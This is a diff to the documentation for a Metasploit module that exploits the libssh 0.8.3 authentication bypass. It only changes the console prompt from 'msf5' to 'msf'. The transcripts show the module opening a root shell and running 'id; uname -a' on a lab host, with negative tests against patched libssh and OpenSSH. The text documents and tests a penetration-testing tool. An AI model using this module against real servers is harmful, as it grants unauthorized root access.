@@ -134,23 +134,23 @@ OOB authentication packet always returns `true`.
 Positive testing against unpatched libssh 0.8.3:
 
 ```
-msf5 > use auxiliary/scanner/ssh/libssh_auth_bypass
-msf5 auxiliary(scanner/ssh/libssh_auth_bypass) > set rhosts 172.28.128.3
+msf > use auxiliary/scanner/ssh/libssh_auth_bypass
+msf auxiliary(scanner/ssh/libssh_auth_bypass) > set rhosts 172.28.128.3
 rhosts => 172.28.128.3
-msf5 auxiliary(scanner/ssh/libssh_auth_bypass) > set rport 2222
+msf auxiliary(scanner/ssh/libssh_auth_bypass) > set rport 2222
 rport => 2222
-msf5 auxiliary(scanner/ssh/libssh_auth_bypass) > set spawn_pty true
+msf auxiliary(scanner/ssh/libssh_auth_bypass) > set spawn_pty true
 spawn_pty => true
-msf5 auxiliary(scanner/ssh/libssh_auth_bypass) > set verbose true
+msf auxiliary(scanner/ssh/libssh_auth_bypass) > set verbose true
 verbose => true
-msf5 auxiliary(scanner/ssh/libssh_auth_bypass) > run
+msf auxiliary(scanner/ssh/libssh_auth_bypass) > run
 
 [*] 172.28.128.3:2222 - Attempting authentication bypass
 [+] 172.28.128.3:2222 - SSH-2.0-libssh_0.8.3 appears to be unpatched
 [*] Command shell session 1 opened (172.28.128.1:56981 -> 172.28.128.3:2222) at 2018-10-19 12:38:24 -0500
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-msf5 auxiliary(scanner/ssh/libssh_auth_bypass) > sessions -1
+msf auxiliary(scanner/ssh/libssh_auth_bypass) > sessions -1
 [*] Starting interaction with 1...
 
 # id
@@ -168,11 +168,11 @@ tty
 Positive testing of shell commands using the `Execute` action:
 
 ```
-msf5 auxiliary(scanner/ssh/libssh_auth_bypass) > set action Execute
+msf auxiliary(scanner/ssh/libssh_auth_bypass) > set action Execute
 action => Execute
-msf5 auxiliary(scanner/ssh/libssh_auth_bypass) > set cmd id; uname -a
+msf auxiliary(scanner/ssh/libssh_auth_bypass) > set cmd id; uname -a
 cmd => id; uname -a
-msf5 auxiliary(scanner/ssh/libssh_auth_bypass) > run
+msf auxiliary(scanner/ssh/libssh_auth_bypass) > run
 
 [*] 172.28.128.3:2222 - Attempting authentication bypass
 [+] 172.28.128.3:2222 - SSH-2.0-libssh_0.8.3 appears to be unpatched
@@ -181,53 +181,53 @@ uid=0(root) gid=0(root) groups=0(root)
 Linux ubuntu-xenial 4.4.0-134-generic #160-Ubuntu SMP Wed Aug 15 14:58:00 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-msf5 auxiliary(scanner/ssh/libssh_auth_bypass) >
+msf auxiliary(scanner/ssh/libssh_auth_bypass) >
 ```
 
 Negative testing against patched libssh 0.8.4:
 
 ```
-msf5 auxiliary(scanner/ssh/libssh_auth_bypass) > run
+msf auxiliary(scanner/ssh/libssh_auth_bypass) > run
 
 [*] 172.28.128.3:2222 - Attempting authentication bypass
 [-] 172.28.128.3:2222 - SSH-2.0-libssh_0.8.4 appears to be patched
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-msf5 auxiliary(scanner/ssh/libssh_auth_bypass) >
+msf auxiliary(scanner/ssh/libssh_auth_bypass) >
 ```
 
 Negative testing against an insufficiently implemented libssh server:
 
 ```
-msf5 auxiliary(scanner/ssh/libssh_auth_bypass) > run
+msf auxiliary(scanner/ssh/libssh_auth_bypass) > run
 
 [*] 172.28.128.3:2222 - Attempting authentication bypass
 [+] 172.28.128.3:2222 - SSH-2.0-libssh_0.8.3 appears to be unpatched
 [-] 172.28.128.3:2222 - Net::SSH::ChannelOpenFailed: Session channel open failed (1)
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-msf5 auxiliary(scanner/ssh/libssh_auth_bypass) > run
+msf auxiliary(scanner/ssh/libssh_auth_bypass) > run
 
 [*] 172.28.128.3:2222 - Attempting authentication bypass
 [+] 172.28.128.3:2222 - SSH-2.0-libssh_0.8.3 appears to be unpatched
 [-] 172.28.128.3:2222 - Net::SSH::ChannelRequestFailed: Shell/exec channel request failed
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-msf5 auxiliary(scanner/ssh/libssh_auth_bypass) >
+msf auxiliary(scanner/ssh/libssh_auth_bypass) >
 ```
 
 Negative testing against OpenSSH:
 
 ```
-msf5 auxiliary(scanner/ssh/libssh_auth_bypass) > set rport 22
+msf auxiliary(scanner/ssh/libssh_auth_bypass) > set rport 22
 rport => 22
-msf5 auxiliary(scanner/ssh/libssh_auth_bypass) > run
+msf auxiliary(scanner/ssh/libssh_auth_bypass) > run
 
 [*] 172.28.128.3:22 - Attempting authentication bypass
 [-] 172.28.128.3:22 - SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.4 does not appear to be libssh
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-msf5 auxiliary(scanner/ssh/libssh_auth_bypass) >
+msf auxiliary(scanner/ssh/libssh_auth_bypass) >
 ```
 
 Confirming auth is still normally present using the OpenSSH client:
